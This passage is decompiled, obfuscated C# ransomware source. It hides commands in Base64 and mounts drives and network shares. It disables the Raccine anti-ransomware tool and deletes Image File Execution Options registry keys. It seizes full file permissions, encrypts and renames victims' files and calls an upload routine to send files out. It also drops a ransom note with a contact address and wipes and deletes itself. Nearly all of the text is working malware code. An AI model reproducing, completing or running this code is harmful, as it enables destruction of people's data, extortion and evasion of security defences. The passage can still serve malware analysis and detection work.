				File.WriteAllText(text, bxMeQFfPcma("bW91bnR2b2wgfCBmaW5kICJ9XCIgPiB2LnR4dAoKKEZvciAvRiAlJWkgSW4gKHYudHh0KSBEbyAoCiAgICAgIFNldCBmcmVlZHJpdmU9MAogICAgICBGT1IgJSVkIElOIChDIEQgRSBGIEcgSCBJIEogSyBMIE0gTiBPIFAgUSBSIFMgVCBVIFYgVyBYIFkgWikgRE8gKAogICAgICAgICAgICBJRiBOT1QgRVhJU1QgJSVkOlwgKAogICAgICAgICAgICAgICAgICBJRiAiIWZyZWVkcml2ZSEiPT0iMCIgKAogICAgICAgICAgICAgICAgICAgICAgICBTZXQgZnJlZWRyaXZlPSUlZAogICAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICkKICAgICAgKQogICAgICBtb3VudHZvbCAhZnJlZWRyaXZlITogJSVpCiAgICAgIHBpbmcgLW4gMiAxMjcuMC4wLjEKKSkKU2V0IGRyaXZlaWQ9MApGT1IgJSVkIElOIChDIEQgRSBGIEcgSCBJIEogSyBMIE0gTiBPIFAgUSBSIFMgVCBVIFYgVyBYIFkgWikgRE8gKAogICAgICBJRiBFWElTVCAlJWQ6XCAoCiAgICAgICAgICAgIFNldCAvYSBkcml2ZWlkKz0xCiAgICAgICAgICAgIGVjaG8gXjxTaGFyZWRGb2xkZXIgbmFtZT0iIWRyaXZlaWQhIiBob3N0UGF0aD0iJSVkOlwiIHdyaXRhYmxlPSJ0cnVlIi9ePiA+PnNmLnR4dAogICAgICAgICAp"), Encoding.ASCII);
				fsugkvmKpd("cmd.exe", "/C " + text);
				if (File.Exists(text))
				{
					File.Delete(text);
				}
				if (File.Exists(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), "v.txt")))
				{
					File.Delete(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), "v.txt"));
				}
				if (File.Exists(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), "sf.txt")))
				{
					File.Delete(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), "sf.txt"));
				}
			}
			catch
			{
			}
		}
		ManagementObjectSearcher val = new ManagementObjectSearcher("select * from Win32_NetworkConnection");
		ManagementObjectEnumerator enumerator5 = val.Get().GetEnumerator();
		try
		{
			while (enumerator5.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator5.get_Current();
				if (!SrDtznAsnWUwPJK.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace("\\\\", "\\").Replace("\\\\\\\\", "\\\\")
					.Replace("\"", "")
					.Split(new char[1] { '(' })[0].Trim()))
				{
					SrDtznAsnWUwPJK.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace("\\\\", "\\").Replace("\\\\\\\\", "\\\\")
						.Replace("\"", "")
						.Split(new char[1] { '(' })[0].Trim().Replace("IPC$", "") + "Users");
				}
			}
		}
		finally
		{
			((IDisposable)enumerator5)?.Dispose();
		}
	}

	public static bool yZElMlolZoVNvTJ()
	{
		WebRequest webRequest = WebRequest.Create("https://www.google.com/");
		try
		{
			webRequest.GetResponse();
		}
		catch
		{
			return false;
		}
		return true;
	}

	public static void zYZPgrtpuN(string qWogIIITItSXmA)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = bxMeQFfPcma("cG93ZXJzaGVsbC5leGU=");
		processStartInfo.Arguments = "& " + qWogIIITItSXmA;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool bLBdyNLBnFDdJu(string rDQYpYmDJdv, string BUGTdxblbID)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(rDQYpYmDJdv, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(BUGTdxblbID);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(rDQYpYmDJdv, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static string fmqXdJzsHgp(SecureString hbGGScqaFqMbn)
	{
		string empty = string.Empty;
		IntPtr intPtr = Marshal.SecureStringToBSTR(hbGGScqaFqMbn);
		try
		{
			return Marshal.PtrToStringBSTR(intPtr);
		}
		finally
		{
			Marshal.ZeroFreeBSTR(intPtr);
		}
	}

	public static void LnebXiThMQQwq()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string lCwudDFvrFSxTW = cDwRmlrgXHB("==wcu9Wa0B3Tg42bpRXdjVGeFBSZslmRgU2Zh1WSc52bpNnclZFduVmcyV3QcRlTgM3dvRmbpdFX0Z2bz9mcjlWTcVkUBdFVG90U");
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(bxMeQFfPcma(lCwudDFvrFSxTW), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(bxMeQFfPcma("dnNzYWRtaW4uZXhl"));
					registryKey.DeleteSubKey(bxMeQFfPcma("d21pYy5leGU="));
					registryKey.DeleteSubKey(bxMeQFfPcma("d2JhZG1pbi5leGU="));
					registryKey.DeleteSubKey(bxMeQFfPcma("YmNkZWRpdC5leGU="));
					registryKey.DeleteSubKey(bxMeQFfPcma("cG93ZXJzaGVsbC5leGU="));
					registryKey.DeleteSubKey(bxMeQFfPcma("ZGlza3NoYWRvdy5leGU="));
					registryKey.DeleteSubKey(bxMeQFfPcma("bmV0LmV4ZQ=="));
					registryKey.Close();
				}
				lCwudDFvrFSxTW = cDwRmlrgXHB("u9Wa0F2YpxGcwFEXn9GT05WZ2VEXzV2YpZnclNFX0V2Us9mc052bDRnblJnc1NEXNVEVTl1U");
				registryKey = Registry.LocalMachine.OpenSubKey(bxMeQFfPcma(lCwudDFvrFSxTW), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(bxMeQFfPcma("UmFjY2luZQ=="));
					registryKey.Close();
				}
				lCwudDFvrFSxTW = cDwRmlrgXHB("=UkUBdFVG90U");
				registryKey = Registry.LocalMachine.OpenSubKey(bxMeQFfPcma(lCwudDFvrFSxTW), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(bxMeQFfPcma("UmFjY2luZQ=="));
					registryKey.Close();
				}
				lCwudDFvrFSxTW = cDwRmlrgXHB("=UkUBdFVG90U");
				registryKey = Registry.CurrentUser.OpenSubKey(bxMeQFfPcma(lCwudDFvrFSxTW), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(bxMeQFfPcma("UmFjY2luZQ=="));
					registryKey.Close();
				}
			}
			catch
			{
			}
			fsugkvmKpd(bxMeQFfPcma("dGFza2tpbGw="), bxMeQFfPcma("L0YgL0lNIFJhY2NpbmVTZXR0aW5ncy5leGU="));
			fsugkvmKpd(bxMeQFfPcma("cmVn"), bxMeQFfPcma("ZGVsZXRlICJIS0NVXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biIgL1YgIlJhY2NpbmUgVHJheSIgL0Y="));
			fsugkvmKpd(bxMeQFfPcma("cmVn"), bxMeQFfPcma("ZGVsZXRlIEhLQ1VcU29mdHdhcmVcUmFjY2luZSAvRg=="));
			fsugkvmKpd(bxMeQFfPcma("c2NodGFza3M="), bxMeQFfPcma("L0RFTEVURSAvVE4gIlJhY2NpbmUgUnVsZXMgVXBkYXRlciIgL0Y="));
		}
		catch
		{
		}
	}

	public static void QvrqrwsywdSEqe(string OFaWtTQKYUfZF, byte[] ybmIhmUKELnWII)
	{
		try
		{
			byte[] bytes = Encoding.ASCII.GetBytes(bxMeQFfPcma("R290QWxsRG9uZQ=="));
			using FileStream fileStream = new FileStream(OFaWtTQKYUfZF, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(ybmIhmUKELnWII, 0, ybmIhmUKELnWII.Length);
			fileStream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void tyiQNYKOhJeyw()
	{
		string lCwudDFvrFSxTW = cDwRmlrgXHB("==QblR3c5NVZslmRcx2byRnbvNEX0V2Us9mc052bDRnblJnc1NEXNVEVTl1U");
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(bxMeQFfPcma(lCwudDFvrFSxTW), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(bxMeQFfPcma("TG9uZ1BhdGhzRW5hYmxlZA=="), 1, RegistryValueKind.DWord);
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void vbjShwojRkogcTDaJ()
	{
		fsugkvmKpd("cmd.exe", bxMeQFfPcma("L0MgcGluZyAxMjcuMC4wLjcgLW4gMyA+IE51bCAmIGZzdXRpbCBmaWxlIHNldFplcm9EYXRhIG9mZnNldD0wIGxlbmd0aD01MjQyODgg4oCcJXPigJ0gJiBEZWwgL2YgL3Eg4oCcJXPigJ0="));
		string text = bxMeQFfPcma("L0MgY2hvaWNlIC9DIFkgL04gL0QgWSAvVCAzICYgRGVsIA==");
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = "\"" + text + "\"" + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = "cmd.exe";
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void RwskFQyGOARyn(string noPdeBQQtpZjg)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(noPdeBQQtpZjg);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(noPdeBQQtpZjg, attributes & ~FileAttributes.ReadOnly);
			}
		}
		catch (Exception ex)
		{
			if (zHjohLaJRunF)
			{
				try
				{
					File.AppendAllText(AycWHRRkQAZMoSL, "File: " + noPdeBQQtpZjg + " - Error while removing readonly attribute: " + ex.Message + "\r\n");
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string WcJqCsWMqEx()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = "";
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = "Me";
				break;
			case 10:
				text = ((!(version.Revision.ToString() == "2222A")) ? "98" : "98SE");
				break;
			case 0:
				text = "95";
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = "NT 3.51";
				break;
			case 4:
				text = "NT 4.0";
				break;
			case 5:
				text = ((version.Minor != 0) ? "XP" : "2000");
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? "8.1" : "8") : "7") : "Vista");
				break;
			case 10:
				text = "10";
				break;
			}
		}
		if (text != "")
		{
			text = "Windows " + text;
			if (oSVersion.ServicePack != "")
			{
				text = text + " " + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string qgsuFjBoMNVeTd(string ScWTEkBfotRPn)
	{
		string text = Path.GetTempPath() + "\\RESTORE_FILES_INFO.txt";
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(bxMeQFfPcma("WW91ciBmaWxlcyBhcmUgc2VjdXJlZC4uLg0KbWlsbGVuaTUwMDBAcXEuY29t"));
				streamWriter.WriteLine("\r\n");
				streamWriter.WriteLine(bxMeQFfPcma("S2V5IElkZW50aWZpZXI6IA=="));
				streamWriter.WriteLine(ScWTEkBfotRPn);
			}
			else
			{
				File.AppendAllText(text, "\r\nAditional KeyId:\r\n" + ScWTEkBfotRPn);
			}
			return text;
		}
		catch (Exception ex)
		{
			if (zHjohLaJRunF)
			{
				try
				{
					File.AppendAllText(AycWHRRkQAZMoSL, "Error while writing Temp Folder Report: " + ex.Message + "\r\n");
					return text;
				}
				catch (Exception)
				{
					return text;
				}
			}
			return text;
		}
	}

	public static void SqgHOdsTAHcvL(string fsqgCbNckYfiGkV, string nzZZaACTJpmg)
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + fsqgCbNckYfiGkV + ".url");
		streamWriter.WriteLine("[Summary]");
		streamWriter.WriteLine("URL=file:///" + nzZZaACTJpmg);
		streamWriter.WriteLine("IconIndex=0");
		string text = nzZZaACTJpmg.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text);
	}

	private static void qdZBBCUpAVjS(string[] QDtLfpZzVfd, string[] MGlBWQLIGxO, string[] JExbTsvlRtTBE, string mKJKGKQEwnEEtk, string ufpZWDlAST)
	{
		hUqYxvezKdhZvA = Encoding.ASCII.GetBytes(mKJKGKQEwnEEtk);
		DriveInfo[] array = null;
		if (QDtLfpZzVfd[0] == "[auto]")
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (array[i].IsReady && array[i].DriveType != DriveType.CDRom && !SrDtznAsnWUwPJK.Contains(array[i].Name))
					{
						SrDtznAsnWUwPJK.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < QDtLfpZzVfd.Length; j++)
			{
				if (!SrDtznAsnWUwPJK.Contains(QDtLfpZzVfd[j]))
				{
					SrDtznAsnWUwPJK.Add(QDtLfpZzVfd[j]);
				}
			}
		}
		if (SrDtznAsnWUwPJK.Contains(bxMeQFfPcma("Qzpc")) && WNCjifyCxeOOO == "YES")
		{
			SrDtznAsnWUwPJK.Remove(bxMeQFfPcma("Qzpc"));
		}
		Parallel.ForEach(SrDtznAsnWUwPJK, delegate(string t)
		{
			if (DLfPrQdkdIeFtqyQh && !WcJqCsWMqEx().Contains("XP"))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						bLBdyNLBnFDdJu(WindowsIdentity.GetCurrent().Name, t);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (HNEisHCJMOwx == "YES")
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					VtEtSIQGnyoaU(t, MGlBWQLIGxO, ufpZWDlAST, JExbTsvlRtTBE, mKJKGKQEwnEEtk);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				VtEtSIQGnyoaU(t, MGlBWQLIGxO, ufpZWDlAST, JExbTsvlRtTBE, mKJKGKQEwnEEtk);
			}
		});
	}

	public static void VtEtSIQGnyoaU(string KlFqueZFaMCi, string[] mhAbdZavncPZP, string UCNGJDJhEbalfJf, string[] FSMkdUGdKYmqtns, string qJDGhMRVAopoWhMA)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add("");
		List<string> list3 = list2;
		if (SjwzUIUdnzB == "NO")
		{
			list = lzbBWixgXIuZo(KlFqueZFaMCi, mhAbdZavncPZP, UCNGJDJhEbalfJf, FSMkdUGdKYmqtns, qJDGhMRVAopoWhMA);
			return;
		}
		list = ojupeqwEhcrLE.SearchFiles(KlFqueZFaMCi);
		foreach (string text in mhAbdZavncPZP)
		{
			foreach (string item in list)
			{
				if (FSMkdUGdKYmqtns.Length != 0)
				{
					int num = 0;
					while (num < FSMkdUGdKYmqtns.Length)
					{
						string value = FSMkdUGdKYmqtns[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_02f2;
					}
				}
				if ((DlXcPcbfAEzo == "NO" && !item.EndsWith(text)) || XYGILCGcqmQH.Contains(item))
				{
					continue;
				}
				if (TrXhqrcUQGBU == "YES")
				{
					try
					{
						if (vIiOdwpLyxjpGf.iDVHILqBuXK(item))
						{
							vIiOdwpLyxjpGf.QPpsHyEiCqZW(item);
						}
					}
					catch
					{
					}
				}
				XYGILCGcqmQH.Add(item);
				if (!djMglWkrThaf.Contains(Path.GetDirectoryName(item)))
				{
					djMglWkrThaf.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (QYebiuGveQzf == "YES" && fileStream.Length > Convert.ToInt32(RZwhptcFPa) * 1024 * 1024 && !list3.Contains(text))
					{
						if (vyQhuqfsME == "YES")
						{
							foreach (string item2 in hDIFdHdmiGRW)
							{
								if (item.ToLower().EndsWith(item2) && aQljRLcneiL == "YES")
								{
									if (Convert.ToInt32(DKFiWstOyiqUH) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											QtudfCYcVUfF.FFwygAkuXreOyx("URL", "USERNAME", "ACCESO", item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && aQljRLcneiL == "NO")
								{
									try
									{
										QtudfCYcVUfF.FFwygAkuXreOyx("URL", "USERNAME", "ACCESO", item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] jGoBplVQShFVC = UMuLPfDIPbk.fVqAzfnOgclWqh(item, Convert.ToInt32(RZwhptcFPa) * 1024 * 1024);
						byte[] nciqQhSWbfClU = UMuLPfDIPbk.cbzUtQrNiJp(jGoBplVQShFVC, Encoding.ASCII.GetBytes(qJDGhMRVAopoWhMA), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						UMuLPfDIPbk.mSMdqwRUXGu(item, nciqQhSWbfClU);
						if (UCNGJDJhEbalfJf != ".*")
						{
							File.Move(item, item + UCNGJDJhEbalfJf);
						}
					}
					else if (UCNGJDJhEbalfJf != ".*")
					{
						omlVqZFpCs(item, item + UCNGJDJhEbalfJf, hUqYxvezKdhZvA);
					}
					else
					{
						omlVqZFpCs(item, item + ".part", hUqYxvezKdhZvA);
					}
				}
				catch (Exception)
				{
				}
				IL_02f2:;
			}
		}
	}

	public static void shFQtiwLvU(List<string> wonGhQdNYWV, string[] qmvRrOfRvqLstmJ, string lMWKbzIoWOCjzA, string[] yfsfNjzeaspH, string mUFfHMbfbMQl)
	{
		List<string> ZmazVdvZdatVgRw = new List<string> { "" };
		if (DlXcPcbfAEzo == "NO")
		{
			string eSKyHypYUiyygGvE;
			Parallel.ForEach(qmvRrOfRvqLstmJ, delegate(string t1)
			{
				foreach (string item in wonGhQdNYWV)
				{
					if (yfsfNjzeaspH.Length != 0)
					{
						string[] array4 = yfsfNjzeaspH;
						int num2 = 0;
						while (num2 < array4.Length)
						{
							string value2 = array4[num2];
							if (!item.EndsWith(value2))
							{
								num2++;
								continue;
							}
							goto IL_05e6;
						}
					}
					try
					{
						if (item.EndsWith(lMWKbzIoWOCjzA))
						{
							goto IL_05e6;
						}
					}
					catch (Exception)
					{
						goto IL_05e6;
					}
					if (item.EndsWith(t1) && !XYGILCGcqmQH.Contains(item))
					{
						if (TrXhqrcUQGBU == "YES")
						{
							try
							{
								if (vIiOdwpLyxjpGf.iDVHILqBuXK(item))
								{
									vIiOdwpLyxjpGf.QPpsHyEiCqZW(item);
								}
							}
							catch
							{
							}
						}
						XYGILCGcqmQH.Add(item);
						if (!djMglWkrThaf.Contains(Path.GetDirectoryName(item)))
						{
							djMglWkrThaf.Add(Path.GetDirectoryName(item));
						}
						RwskFQyGOARyn(item);
						try
						{
							try
							{
								if (new FileInfo(item).Length != 0L)
								{
									goto end_IL_00e5;
								}
								goto end_IL_00e5_2;
								end_IL_00e5:;
							}
							catch (Exception ex12)
							{
								if (zHjohLaJRunF)
								{
									try
									{
										File.AppendAllText(AycWHRRkQAZMoSL, "File: " + item + " - Error while reading if filesize is zero: " + ex12.Message + "\r\n");
									}
									catch (Exception)
									{
									}
								}
								goto end_IL_00e5_2;
							}
							if (QYebiuGveQzf == "YES" && new FileInfo(item).Length > Convert.ToInt32(RZwhptcFPa) * 1024 * 1024 && !ZmazVdvZdatVgRw.Contains(t1))
							{
								try
								{
									if (lMWKbzIoWOCjzA != ".*")
									{
										File.Move(item, item + lMWKbzIoWOCjzA);
									}
								}
								catch (Exception ex14)
								{
									if (!zHjohLaJRunF)
									{
										break;
									}
									try
									{
										File.AppendAllText(AycWHRRkQAZMoSL, "File: " + item + " - Error while renaming to crypted extension: " + ex14.Message + "\r\n");
										break;
									}
									catch (Exception)
									{
										break;
									}
								}
								eSKyHypYUiyygGvE = "";
								if (lMWKbzIoWOCjzA != ".*")
								{
									eSKyHypYUiyygGvE = item + lMWKbzIoWOCjzA;
								}
								else
								{
									eSKyHypYUiyygGvE = item;
								}
								if (vyQhuqfsME == "YES")
								{
									Thread thread2 = new Thread((ThreadStart)delegate
									{
										foreach (string item2 in hDIFdHdmiGRW)
										{
											if (eSKyHypYUiyygGvE.ToLower().EndsWith(item2 + lMWKbzIoWOCjzA) && aQljRLcneiL == "YES")
											{
												if (Convert.ToInt32(DKFiWstOyiqUH) * 1024 * 1024 > new FileInfo(eSKyHypYUiyygGvE).Length)
												{
													try
													{
														QtudfCYcVUfF.FFwygAkuXreOyx("URL", "USERNAME", "ACCESO", eSKyHypYUiyygGvE);
													}
													catch
													{
													}
												}
											}
											else if (eSKyHypYUiyygGvE.ToLower().EndsWith(item2) && aQljRLcneiL == "NO")
											{
												try
												{
													QtudfCYcVUfF.FFwygAkuXreOyx("URL", "USERNAME", "ACCESO", eSKyHypYUiyygGvE);
												}
												catch
												{
												}
											}
										}
									});
									thread2.Priority = ThreadPriority.Normal;
									thread2.IsBackground = false;
									thread2.Start();
								}
								string text3 = gQuYjEmPxqYv.VAHTkDGshMkF(32);
								string s3 = jEsaJdxjWqPyGCH.stchvRxTqLlLx(text3);
								byte[] bytes3 = Encoding.ASCII.GetBytes(s3);
								byte[] array5 = null;
								byte[] array6 = UMuLPfDIPbk.fVqAzfnOgclWqh(eSKyHypYUiyygGvE, Convert.ToInt32(RZwhptcFPa) * 1024 * 1024);
								UMuLPfDIPbk.mSMdqwRUXGu(NciqQhSWbfClU: (!zYwzjEDkZQtaV) ? (TiYWIzCfNH ? UMuLPfDIPbk.cbzUtQrNiJp(array6, Encoding.ASCII.GetBytes(text3), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : UMuLPfDIPbk.cbzUtQrNiJp(array6, Encoding.ASCII.GetBytes(mUFfHMbfbMQl), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (TiYWIzCfNH ? CYEAiHugFcXLfMP.yrhlrOiGLQmYz(array6, Encoding.ASCII.GetBytes(text3), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : CYEAiHugFcXLfMP.yrhlrOiGLQmYz(array6, Encoding.ASCII.GetBytes(mUFfHMbfbMQl), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), MmblxfahxxCq: eSKyHypYUiyygGvE, DrFOiocWmftuTC: bytes3);
							}
							else
							{
								string text4 = gQuYjEmPxqYv.VAHTkDGshMkF(32);
								string s4 = jEsaJdxjWqPyGCH.stchvRxTqLlLx(text4);
								byte[] bytes4 = Encoding.ASCII.GetBytes(s4);
								if (lMWKbzIoWOCjzA != ".*")
								{
									if (!HvyOqSUDzaouQicF)
									{
										if (!TiYWIzCfNH)
										{
											cPxOexmGvTaNs(item, item + lMWKbzIoWOCjzA, hUqYxvezKdhZvA);
										}
										else
										{
											cPxOexmGvTaNs(item, item + lMWKbzIoWOCjzA, Encoding.ASCII.GetBytes(text4));
										}
									}
									else
									{
										try
										{
											if (!TiYWIzCfNH)
											{
												nDXMFwKsrVToPZ(item, item + lMWKbzIoWOCjzA, hUqYxvezKdhZvA);
											}
											else
											{
												nDXMFwKsrVToPZ(item, item + lMWKbzIoWOCjzA, Encoding.ASCII.GetBytes(text4));
											}
										}
										catch (Exception ex16)
										{
											if (zHjohLaJRunF)
											{
												try
												{
													File.AppendAllText(AycWHRRkQAZMoSL, "File: " + item + " - Error while fully writing to file: " + ex16.Message + "\r\n");
												}
												catch (Exception)
												{
												}
											}
										}
									}
								}
								else if (!HvyOqSUDzaouQicF)
								{
									if (!TiYWIzCfNH)
									{
										cPxOexmGvTaNs(item, item + ".part", hUqYxvezKdhZvA);
									}
									else
									{
										cPxOexmGvTaNs(item, item + ".part", Encoding.ASCII.GetBytes(text4));
									}
								}
								else
								{
									try
									{
										if (!TiYWIzCfNH)
										{
											nDXMFwKsrVToPZ(item, item, hUqYxvezKdhZvA);
										}
										else
										{
											nDXMFwKsrVToPZ(item, item, Encoding.ASCII.GetBytes(text4));
										}
									}
									catch (Exception ex18)
									{
										if (zHjohLaJRunF)
										{
											try
											{
												File.AppendAllText(AycWHRRkQAZMoSL, "File: " + item + " - Error while fully writing to file: " + ex18.Message + "\r\n");
											}
											catch (Exception)
											{
											}
										}
									}
								}
								if (TiYWIzCfNH)
								{
									if (lMWKbzIoWOCjzA != ".*")
									{
										QvrqrwsywdSEqe(item + lMWKbzIoWOCjzA, bytes4);
									}
									else
									{
										QvrqrwsywdSEqe(item, bytes4);
									}
								}
							}
							goto IL_05e6;
							end_IL_00e5_2:;
						}
						catch (Exception)
						{
							goto IL_05e6;
						}
					}
					continue;
					IL_05e6:
					wonGhQdNYWV.Remove(item);
				}
			});
			return;
		}
		Parallel.ForEach(wonGhQdNYWV, delegate(string fileInfo)
		{
			if (yfsfNjzeaspH.Length != 0)
			{
				string[] array = yfsfNjzeaspH;
				int num = 0;
				while (num < array.Length)
				{
					string value = array[num];
					if (!fileInfo.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_0676;
				}
			}
			try
			{
				if (fileInfo.EndsWith(lMWKbzIoWOCjzA))
				{
					goto IL_0676;
				}
			}
			catch (Exception)
			{
				goto IL_0676;
			}
			if (!XYGILCGcqmQH.Contains(fileInfo))
			{
				if (TrXhqrcUQGBU == "YES")
				{
					try
					{
						if (vIiOdwpLyxjpGf.iDVHILqBuXK(fileInfo))
						{
							vIiOdwpLyxjpGf.QPpsHyEiCqZW(fileInfo);
						}
					}
					catch
					{
					}
				}
				XYGILCGcqmQH.Add(fileInfo);
				if (!djMglWkrThaf.Contains(Path.GetDirectoryName(fileInfo)))
				{
					djMglWkrThaf.Add(Path.GetDirectoryName(fileInfo));
				}
				RwskFQyGOARyn(fileInfo);
				try
				{
					try
					{
						if (new FileInfo(fileInfo).Length != 0L)
						{
							goto end_IL_010d;
						}
						goto end_IL_010d_2;
						end_IL_010d:;
					}
					catch (Exception ex2)
					{
						if (zHjohLaJRunF)
						{
							try
							{
								File.AppendAllText(AycWHRRkQAZMoSL, "File: " + fileInfo + " - Error while reading if filesize is zero: " + ex2.Message + "\r\n");
							}
							catch (Exception)
							{
							}
						}
						goto end_IL_010d_2;
					}
					if (QYebiuGveQzf == "YES" && new FileInfo(fileInfo).Length > Convert.ToInt32(RZwhptcFPa) * 1024 * 1024)
					{
						try
						{
							if (lMWKbzIoWOCjzA != ".*")
							{
								File.Move(fileInfo, fileInfo + lMWKbzIoWOCjzA);
							}
						}
						catch (Exception ex4)
						{
							if (zHjohLaJRunF)
							{
								try
								{
									File.AppendAllText(AycWHRRkQAZMoSL, "File: " + fileInfo + " - Error while renaming to crypted extension: " + ex4.Message + "\r\n");
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
							return;
						}
						if (lMWKbzIoWOCjzA != ".*")
						{
							fileInfo += lMWKbzIoWOCjzA;
						}
						if (vyQhuqfsME == "YES")
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item3 in hDIFdHdmiGRW)
								{
									if (fileInfo.ToLower().EndsWith(item3 + lMWKbzIoWOCjzA) && aQljRLcneiL == "YES")
									{
										if (Convert.ToInt32(DKFiWstOyiqUH) * 1024 * 1024 > new FileInfo(fileInfo).Length)
										{
											try
											{
												QtudfCYcVUfF.FFwygAkuXreOyx("URL", "USERNAME", "ACCESO", fileInfo);
											}
											catch
											{
											}
										}
									}
									else if (fileInfo.ToLower().EndsWith(item3) && aQljRLcneiL == "NO")
									{
										try
										{
											QtudfCYcVUfF.FFwygAkuXreOyx("URL", "USERNAME", "ACCESO", fileInfo);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = gQuYjEmPxqYv.VAHTkDGshMkF(32);
						string s = jEsaJdxjWqPyGCH.stchvRxTqLlLx(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array2 = null;
						byte[] array3 = UMuLPfDIPbk.fVqAzfnOgclWqh(fileInfo, Convert.ToInt32(RZwhptcFPa) * 1024 * 1024);
